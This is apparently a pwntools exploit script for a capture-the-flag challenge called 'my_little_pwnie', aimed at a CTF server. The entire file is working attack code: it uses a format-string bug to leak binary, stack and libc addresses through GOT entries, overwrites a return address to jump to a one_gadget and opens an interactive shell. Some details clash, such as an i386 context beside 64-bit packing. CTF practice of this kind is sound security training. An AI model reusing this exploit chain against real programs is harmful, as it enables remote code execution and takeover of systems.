#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./for_players/my_little_pwnie"
#"""
HOST = "framed.zajebistyc.tf"
PORT = 17003
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	libc = ELF('./libc.so.6')
else:
	conn = process(FILE_NAME)
	#libc = ELF('./')

elf = ELF(FILE_NAME)
off_got_exit = elf.got["exit"]
off_got_printf = elf.got["printf"]
off_got_setvbuf = elf.got["setvbuf"]

off_printf = libc.symbols["printf"]
gadget = [0x4f3d5, 0x4f432, 0x10a41c]

def ret_addr(rsp,addr):
	payload = fsb(2, 6+(0x80//8), addr, 0, 3) # the function from original module (kmpwn)
	payload += b"\x00"*(0x80-len(payload)) # padding with \x00 for one_gadget RCE
	payload += p64(rsp-0x8)
	payload += p64(rsp-0x8+2)
	payload += p64(rsp-0x8+4)
	conn.sendline(payload)

def exploit():
	payload = "ABC%67$p,%68$p" # leak the addresses of binary base and stack
	conn.sendline(payload)
	
	conn.recvuntil("ABC")
	addr_main = int(conn.recvuntil(",")[:-1],16)
	bin_base = addr_main - 0x4a0
	got_exit = bin_base + off_got_exit
	got_printf = bin_base + off_got_printf
	got_setvbuf = bin_base + off_got_setvbuf
	addr_stack = int(conn.recvline(),16)
	crnt_rsp = addr_stack-0x210
		
	ret_addr(crnt_rsp, addr_main+9) 
	crnt_rsp -= 0x210
	
	payload = b"ABC,%14$s,%15$s,"		# leak the address of libc
	payload += b"A"*(0x40-len(payload))
	payload += p64(got_setvbuf)
	payload += p64(got_printf)
	conn.sendline(payload)
	conn.recvuntil("ABC,")
	libc_setvbuf = u64(conn.recvuntil(",")[:-1]+b"\x00\x00")
	libc_printf = u64(conn.recvuntil(",")[:-1]+b"\x00\x00")
	libc_base = libc_printf - off_printf
	one_gadget = libc_base + gadget[1]

	ret_addr(crnt_rsp, addr_main+9)
	crnt_rsp -= 0x210

	ret_addr(crnt_rsp, one_gadget)

	#print(hex(libc_base))
	#print(hex(bin_base))
	#print(hex(crnt_rsp))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
